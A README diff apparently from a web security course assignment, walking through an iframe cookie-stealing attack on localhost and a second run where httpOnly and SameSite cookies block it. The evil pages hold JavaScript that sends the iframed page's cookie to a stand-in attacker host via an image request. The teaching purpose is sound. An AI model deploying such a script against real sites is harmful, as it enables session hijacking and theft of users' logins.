@@ -129,16 +129,181 @@
 
 ## Frame attack
 
-### List of files in Frame-attack directory  
- * [evil_site.html](frame-attack/evil_site.html): Page stealing cookies of an iframed page (unsafe_site.html) 
- * [evil_site1.html](frame-attack/evil_site1.html): Page trying to steal cookies of an iframed page (safe_site.html) 
- * [safe_site.html](frame-attack/safe_site.html): Page with protected cookie using httpOnly & Samesite (strict)
- * [unsafe_site.html](frame-attack/unsafe_site.html): Page with unprotected cookie
- * [server_1.js](frame-attack/server_1.js): server hosting evil site on localhost:8000  
- * [server_2.js](frame-attack/server_2.js): server hosting safe and unsafe pages on localhost:5000 
-
-
 ### Youtube Video: 
 
-### Summary
+### Stealing Cookie
 
+#### Players:
+* [evil_site.html](frame-attack/evil_site.html): Page stealing cookies of an iframed page (unsafe_site.html) 
+* [unsafe_site.html](frame-attack/unsafe_site.html): Page with unprotected cookie
+ * [server_1.js](frame-attack/server_1.js): Server hosting evil site on localhost:8000  
+ * [server_2.js](frame-attack/server_2.js): Server hosting safe and unsafe pages on localhost:5000 
+
+#### Steps
+
+* Set-up victim page
+```diff
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <title>Frame-attack</title>
+</head>
+<body>
+	<h1>My cookies are getting stolen!</h1>
+	<br>
+	<script type="text/javascript">
+		document.write(document.cookie);
+</script>
+</body>
+</html>
+```
+
+* Host the victim page and set the cookie for the page. I have used `cookie-parser` npm package to set the cookies.
+```diff
+const port = 5000
+const app = express()
+app.use((cookieParser()))
+
+app.get('/unsafe', (req, res) => {
+	res.cookie('login','SecretAdmin')
+    stream = createReadStream('unsafe_site.html')
+    stream.pipe(res)  
+})
+```
+
+
+* Iframe the victim site on the evil site. Add javascript to steal the cookies of an iframed page.
+```diff
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <title>Frame-attack</title>
+</head>
+<body>
+	<h1>Assignment 4, CS 495/595 Web Security, Spring 2021</h1>
+	<br>
+    <h2>Let steal some cookies using iframes!</h2>
+
+	<hr>
+	     <p>Below iframe cookie is unsafe</p>
+	<script>
+		const iframe = document.createElement('iframe')
+		iframe.src = 'http://localhost:5000/unsafe'
+		document.body.appendChild(iframe)
+
+		setTimeout(function() {
+	    const p = document.createElement('p')
+	    p.innerHTML = iframe.contentDocument.cookie
+	    document.body.appendChild(p)
+
+	    new Image().src = 'https://attacker.localhost:5000/steal?cookie=' + iframe.contentDocument.cookie
+			}, 5000);
+
+		document.write(iframe.contentDocument.cookie)
+		console.log(iframe.contentDocument.cookie)
+	</script>
+
+</body>
+</html>
+
+```
+* Run the attack by hosting the evil site.
+```diff
+const app = express()
+
+app.get('/', (req, res) => {
+    stream = createReadStream('evil_site.html')
+    stream.pipe(res)  
+})
+```
+* Output
+![alt text](frame-attack/sucess_steal.png)
+
+
+### Unsucessful Cookie Stealing
+
+#### Players:
+ * [evil_site1.html](frame-attack/evil_site1.html): Page trying to steal cookies of an iframed page (safe_site.html) 
+ * [safe_site.html](frame-attack/safe_site.html): Page with protected cookie using httpOnly & Samesite (strict)
+ * [server_1.js](frame-attack/server_1.js): Server hosting evil site on localhost:8000  
+ * [server_2.js](frame-attack/server_2.js): Server hosting safe and unsafe pages on localhost:5000 
+
+### Steps:
+
+* Set-up victim page
+```diff
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <title>Frame-attack</title>
+</head>
+<body>
+	<h1>You cant steal my cookies!</h1>
+	<br>
+	<script type="text/javascript">
+		document.write(document.cookie);
+</script>
+</body>
+</html>
+```
+
+* Host the victim page and set the cookie for the page. To protect the cookie, I have included httpOnly and Samesite (strict) in Set-Cookie HTTP response header.
+```diff
+const port = 5000
+const app = express()
+app.use((cookieParser()))
+
+app.get('/safe', (req, res) => {
+	res.cookie('login','SecretAgent', {httpOnly: true, sameSite:'strict'})
+	stream = createReadStream('safe_site.html')
+    stream.pipe(res)  
+})
+```
+
+
+* Iframe the victim site on the evil site (evil_site1.html). Add javascript to steal the cookies of an iframed page.
+```diff
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <title>Frame-attack</title>
+</head>
+<body>
+	<h1>Assignment 4, CS 495/595 Web Security, Spring 2021</h1>
+	<br>
+    <h2>Let steal some cookies using iframes!</h2>
+
+	<hr>
+     <p>Below iframe cookie is safe</p>
+	<script>
+		const iframe = document.createElement('iframe')
+		iframe.src = 'http://localhost:5000/safe'
+		document.body.appendChild(iframe)
+
+		document.write(iframe.contentDocument.cookie)
+		console.log(iframe.contentDocument.cookie)
+
+		setTimeout(function() {
+	    const p = document.createElement('p')
+	    p.innerHTML = iframe.contentDocument.cookie
+	    document.body.appendChild(p)
+
+	    new Image().src = 'https://attack.localhost:5000/steal?cookie=' + iframe.contentDocument.cookie
+			}, 5000);
+	</script>
+</body>
+</html>
+```
+
+* Run the attack by hosting the evil site.
+```diff
+const app = express()
+
+app.get('/1', (req, res) => {
+    stream = createReadStream('evil_site1.html')
+    stream.pipe(res)  
+})
+```
+
+* Output
+![alt text](frame-attack/unsucess_steal.png)
